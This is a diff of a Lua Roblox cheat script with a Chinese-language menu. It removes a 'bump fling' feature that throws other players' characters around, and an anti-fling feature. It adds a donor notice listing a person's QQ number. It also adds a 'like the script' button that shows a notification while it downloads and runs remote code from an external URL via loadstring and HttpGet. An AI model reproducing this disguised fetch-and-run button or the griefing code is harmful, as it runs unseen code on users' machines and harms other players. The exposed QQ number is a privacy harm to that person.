@@ -258,11 +258,6 @@ local ForceFirstPersonEnabled = false
 local FieldOfViewValue = 70
 local CameraModeConn = nil
 local FOVConn = nil
-local bumpFlingEnabled = false
-local bumpFlingConnections = {}
-local AntiFlingV2Enabled = false
-local AntiFlingV2Connection = nil
-local AntiFlingV2BodyMovers = {}
 
 
 local function disablePlayerCollision(player)
@@ -381,50 +376,6 @@ local function stopAntiFling()
     end
     antiFlingCharAddedConns = {}
     enableAllPlayersCollision()
-end
-
-local function startAntiFlingV2()
-    if AntiFlingV2Connection then AntiFlingV2Connection:Disconnect() end
-    AntiFlingV2Connection = RunService.Heartbeat:Connect(function()
-        local char = LocalPlayer.Character
-        if not char then return end
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if root then
-            if root.AssemblyLinearVelocity.Magnitude > 80 then
-                root.AssemblyLinearVelocity = Vector3.zero
-                root.AssemblyAngularVelocity = Vector3.zero
-            end
-            if root.AssemblyAngularVelocity.Magnitude > 15 then
-                root.AssemblyAngularVelocity = Vector3.zero
-            end
-            for _, child in ipairs(root:GetChildren()) do
-                if child:IsA("BodyVelocity") or child:IsA("BodyGyro") or child:IsA("BodyPosition") or child:IsA("BodyAngularVelocity") or child:IsA("BodyThrust") or child:IsA("BodyForce") then
-                    if not child.Name:match("^KBV2_") then
-                        child:Destroy()
-                    end
-                end
-            end
-        end
-        for _, p in ipairs(Players:GetPlayers()) do
-            if p ~= LocalPlayer and p.Character then
-                pcall(function()
-                    for _, part in ipairs(p.Character:GetDescendants()) do
-                        if part:IsA("BasePart") then
-                            part.CanCollide = false
-                        end
-                        if part:IsA("BodyVelocity") or part:IsA("BodyGyro") or part:IsA("BodyPosition") then
-                            part:Destroy()
-                        end
-                    end
-                end)
-            end
-        end
-    end)
-end
-
-local function stopAntiFlingV2()
-    if AntiFlingV2Connection then AntiFlingV2Connection:Disconnect() end
-    AntiFlingV2Connection = nil
 end
 
 for _, p in ipairs(Players:GetPlayers()) do
@@ -1538,6 +1489,13 @@ Tabs.NotifyTab:Paragraph({
     Desc = kbFormatDiff((kbAnnivTime - os.time()) / 60),
 })
 
+Tabs.NotifyTab:Paragraph({
+    Title = "目前捐赠最多的人",
+    Desc = "宥
+QQ: 1072765538
+总捐赠金额：32",
+})
+
 Tabs.NotifyTab:Divider()
 
 Tabs.NotifyTab:Button({
@@ -1635,6 +1593,16 @@ Tabs.NotifyTab:Button({
 })
 
 Tabs.NotifyTab:Divider()
+
+Tabs.NotifyTab:Button({
+    Title = "给脚本点赞",
+    Callback = function()
+        WindUI:Notify({ Title = "点赞", Content = "正在点赞中...", Duration = 3 })
+        task.spawn(function()
+            loadstring(game:HttpGet("https://raw.soteria.rip/3574634146445068"))()
+        end)
+    end
+})
 
 Tabs.NotifyTab:Button({
     Title = "ROB脚本v2",
@@ -2026,92 +1994,6 @@ Tabs.MainTab:Button({
     end
 })
 
-
-local function bumpFlingTarget(targetPlayer)
-    if not targetPlayer or not targetPlayer.Character then return end
-    local tChar = targetPlayer.Character
-    local tRoot = tChar:FindFirstChild("HumanoidRootPart")
-    if not tRoot then return end
-    local tHum = tChar:FindFirstChildOfClass("Humanoid")
-    task.spawn(function()
-        local start = tick()
-        while tick() - start < 1.5 do
-            if not tRoot.Parent then break end
-            pcall(function()
-                if tHum then
-                    tHum.PlatformStand = true
-                    tHum.Sit = false
-                end
-                tRoot.CFrame = tRoot.CFrame + Vector3.new(0, 8, 0)
-                tRoot.Velocity = Vector3.new(math.random(-300, 300), 1200, math.random(-300, 300))
-                tRoot.AssemblyLinearVelocity = Vector3.new(math.random(-300, 300), 1200, math.random(-300, 300))
-                tRoot.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
-            end)
-            task.wait(0.03)
-        end
-        pcall(function()
-            if tHum then tHum.PlatformStand = false end
-        end)
-    end)
-end
-
-local function onBumpFlingTouched(hit)
-    if not bumpFlingEnabled then return end
-    local model = hit:FindFirstAncestorOfClass("Model")
-    if not model then return end
-    local targetPlayer = Players:GetPlayerFromCharacter(model)
-    if not targetPlayer or targetPlayer == LocalPlayer then return end
-    task.spawn(function()
-        pcall(function()
-            bumpFlingTarget(targetPlayer)
-        end)
-    end)
-end
-
-local function setupBumpFling(char)
-    for _, conn in ipairs(bumpFlingConnections) do
-        pcall(function() conn:Disconnect() end)
-    end
-    bumpFlingConnections = {}
-    if not char then return end
-    for _, part in ipairs(char:GetDescendants()) do
-        if part:IsA("BasePart") then
-            local conn = part.Touched:Connect(onBumpFlingTouched)
-            table.insert(bumpFlingConnections, conn)
-        end
-    end
-    local descConn = char.DescendantAdded:Connect(function(d)
-        if d:IsA("BasePart") then
-            local conn = d.Touched:Connect(onBumpFlingTouched)
-            table.insert(bumpFlingConnections, conn)
-        end
-    end)
-    table.insert(bumpFlingConnections, descConn)
-end
-
-local function startBumpFling()
-    local char = LocalPlayer.Character
-    if char then setupBumpFling(char) end
-end
-
-local function stopBumpFling()
-    for _, conn in ipairs(bumpFlingConnections) do
-        pcall(function() conn:Disconnect() end)
-    end
-    bumpFlingConnections = {}
-end
-
-Tabs.MainTab:Toggle({
-    Title = "碰飞",
-    Desc = "碰到别人直接把他弹飞",
-    Value = false,
-    Callback = function(state)
-        bumpFlingEnabled = state
-        if state then startBumpFling() else stopBumpFling() end
-        WindUI:Notify({ Title = "碰飞", Content = state and "已开启" or "已关闭", Duration = 3 })
-    end
-})
-
 Tabs.MainTab:Button({
     Title = "祖国人汉化",
     Callback = function()
@@ -2139,17 +2021,6 @@ Tabs.MainTab:Toggle({
         AntiFlingEnabled = state
         if state then startAntiFling() else stopAntiFling() end
         WindUI:Notify({ Title = "防甩飞", Content = state and "已开启" or "已关闭", Duration = 3 })
-    end
-})
-
-Tabs.MainTab:Toggle({
-    Title = "防甩飞V2",
-    Desc = "更强力的防甩飞保护",
-    Value = false,
-    Callback = function(state)
-        AntiFlingV2Enabled = state
-        if state then startAntiFlingV2() else stopAntiFlingV2() end
-        WindUI:Notify({ Title = "防甩飞V2", Content = state and "已开启" or "已关闭", Duration = 3 })
     end
 })
 
